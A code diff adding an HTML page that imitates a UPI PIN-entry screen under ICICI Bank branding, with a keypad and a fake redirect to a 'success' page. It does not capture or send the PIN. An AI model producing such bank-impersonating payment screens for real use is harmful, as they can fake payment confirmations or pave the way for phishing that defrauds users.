@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>UPI Secure Pay</title>
+    <style>
+        :root {
+            --primary-blue: #002d72;
+            --success-green: #28a745;
+            --bg-gray: #f8f9fa;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            overflow: hidden; /* Prevents scrolling on mobile */
+        }
+
+        .upi-container {
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: white;
+        }
+
+        /* Header */
+        .header {
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .bank-info {
+            font-size: 0.8rem;
+            color: #666;
+            margin-top: 2px;
+        }
+
+        /* Transaction Details */
+        .transaction-box {
+            margin: 20px;
+            padding: 15px;
+            border: 1px solid #c3e6cb;
+            background-color: #f9fffb;
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .pay-text {
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin: 0;
+            color: #333;
+        }
+
+        .recipient {
+            color: #555;
+            font-size: 0.9rem;
+            margin: 4px 0 0;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* PIN Section */
+        .pin-section {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .pin-section p {
+            font-size: 1rem;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        .dot {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ccc;
+            border-radius: 50%;
+            transition: all 0.1s ease;
+        }
+
+        .dot.filled {
+            background: #333;
+            border-color: #333;
+            transform: scale(1.1);
+        }
+
+        .warning {
+            color: #b45309;
+            font-size: 0.75rem;
+            text-align: center;
+            padding: 10px;
+            background: #fffbeb;
+            margin: 0;
+        }
+
+        /* Keypad Area */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            background: var(--bg-gray);
+            border-top: 1px solid #eee;
+            padding-bottom: env(safe-area-inset-bottom); /* For iPhone notches */
+        }
+
+        .keypad button {
+            border: 0.5px solid #eee;
+            background: white;
+            padding: 25px 0;
+            font-size: 1.6rem;
+            font-weight: 400;
+            color: #333;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .keypad button:active {
+            background: #e9ecef;
+        }
+
+        .pay-btn-container {
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pay-btn {
+            background: var(--primary-blue) !important;
+            color: white !important;
+            width: 80%;
+            height: 50px;
+            border-radius: 25px;
+            font-size: 1rem !important;
+            font-weight: bold !important;
+            border: none !important;
+        }
+
+        /* Success Overlay */
+        #loader-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="upi-container">
+    <div class="header">
+        <div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/960px-UPI-Logo-vector.svg.png" alt="UPI" width="60">
+            <div class="bank-info">ICICI Bank</div>
+        </div>
+        <span style="font-size: 24px; color: #999;">✕</span>
+    </div>
+
+    <div class="transaction-box">
+        <div class="details">
+            <p class="pay-text">Pay ₹1001.00</p>
+            <p class="recipient">To: SRIVASTAVA</p>
+        </div>
+        <div style="font-size: 24px;"></div>
+    </div>
+
+    <div class="pin-section">
+        <p>Enter 4-Digit UPI PIN</p>
+        <div class="pin-dots" id="pin-display">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+
+    <p class="warning">Never enter your UPI PIN to receive money</p>
+
+    <div class="keypad">
+        <button onclick="press(1)">1</button>
+        <button onclick="press(2)">2</button>
+        <button onclick="press(3)">3</button>
+        <button onclick="press(4)">4</button>
+        <button onclick="press(5)">5</button>
+        <button onclick="press(6)">6</button>
+        <button onclick="press(7)">7</button>
+        <button onclick="press(8)">8</button>
+        <button onclick="press(9)">9</button>
+        <button onclick="backspace()">⌫</button>
+        <button onclick="press(0)">0</button>
+        <div class="pay-btn-container">
+            <button class="pay-btn" onclick="submitPin()">Pay</button>
+        </div>
+    </div>
+</div>
+
+
+<script>
+    let currentPin = "";
+    const maxLen = 4;
+
+    function updateDisplay() {
+        const dots = document.querySelectorAll('.dot');
+        dots.forEach((dot, index) => {
+            if (index < currentPin.length) {
+                dot.classList.add('filled');
+            } else {
+                dot.classList.remove('filled');
+            }
+        });
+    }
+
+    function press(num) {
+        if (currentPin.length < maxLen) {
+            currentPin += num;
+            updateDisplay();
+            // Optional: Haptic feedback for mobile
+            if (window.navigator.vibrate) window.navigator.vibrate(10);
+        }
+    }
+
+    function backspace() {
+        currentPin = currentPin.slice(0, -1);
+        updateDisplay();
+    }
+
+    function submitPin() {
+        if (currentPin.length === maxLen) {
+          
+          let url=location.href
+          url=url.replace("upipin","success")
+          location.href=url
+
+        } else {
+        }
+    }
+</script>
+
+</body>
+</html>
